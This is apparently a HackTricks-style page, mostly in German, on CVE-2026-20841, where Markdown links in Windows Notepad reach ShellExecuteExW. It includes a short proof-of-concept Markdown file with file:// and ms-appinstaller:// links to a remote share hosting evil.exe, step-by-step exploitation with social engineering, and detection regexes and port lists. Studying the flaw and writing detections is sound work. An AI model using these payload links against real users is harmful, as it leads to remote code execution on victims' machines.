# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows-Anwendungen, die Markdown/HTML rendern, wandeln vom Benutzer gelieferte Links oft in anklickbare Elemente um und übergeben sie an `ShellExecuteExW`. Ohne striktes Scheme-Allowlisting kann jeder registrierte protocol handler (z. B. `file:`, `ms-appinstaller:`) ausgelöst werden, was zu Codeausführung im Kontext des aktuellen Benutzers führen kann.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad wählt den Markdown-Modus **nur für `.md` extensions** via einem festen String-Vergleich in `sub_1400ED5D0()`.
- Unterstützte Markdown-Links:
- Standard: `[text](target)`
- Autolink: `<target>` (gerendert als `[target](target)`), daher sind beide Syntaxvarianten für payloads und detections relevant.
- Link-Klicks werden in `sub_140170F60()` verarbeitet, das eine schwache Filterung durchführt und dann `ShellExecuteExW` aufruft.
- `ShellExecuteExW` leitet an **any configured protocol handler** weiter, nicht nur HTTP(S).

### Payload considerations
- Alle `\\`-Sequenzen im Link werden **vor `ShellExecuteExW` auf `\` normalisiert**, was UNC-/Pfad-Konstruktion und Erkennung beeinflusst.
- `.md`-Dateien sind **nicht standardmäßig mit Notepad verknüpft**; das Opfer muss die Datei weiterhin in Notepad öffnen und den Link anklicken, aber sobald sie gerendert ist, ist der Link klickbar.
- Gefährliche Beispiel-Schemata:
- `file://` um ein lokales/UNC Payload zu starten.
- `ms-appinstaller://` um App Installer-Flows auszulösen. Andere lokal registrierte Schemata können ebenfalls missbrauchbar sein.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Ablauf der Ausnutzung
1. Erstellen Sie eine **`.md`-Datei**, sodass Notepad sie als Markdown rendert.
2. Betten Sie einen Link mit einem gefährlichen URI-Schema ein (`file:`, `ms-appinstaller:` oder einen beliebigen installierten Handler).
3. Liefern Sie die Datei (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB oder ähnlich) und überreden Sie den Benutzer, sie in Notepad zu öffnen.
4. Beim Klick wird der **normalisierte Link** an `ShellExecuteExW` übergeben und der entsprechende Protokoll-Handler führt den referenzierten Inhalt im Kontext des Benutzers aus.

## Erkennungsansätze
- Überwachen Sie Übertragungen von `.md`-Dateien über Ports/Protokolle, die häufig Dokumente liefern: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsen Sie Markdown-Links (standard und autolink) und suchen Sie nach **unabhängig von Groß-/Kleinschreibung** `file:` oder `ms-appinstaller:`.
- Vom Vendor empfohlene Regexes, um den Zugriff auf Remote-Ressourcen zu erfassen:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Berichten zufolge allowlists der Patch lokale Dateien und HTTP(S); alles andere, das `ShellExecuteExW` erreicht, ist verdächtig. Erweitere die Erkennungen bei Bedarf auf andere installierte protocol handlers, da die attack surface je nach System variiert.

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
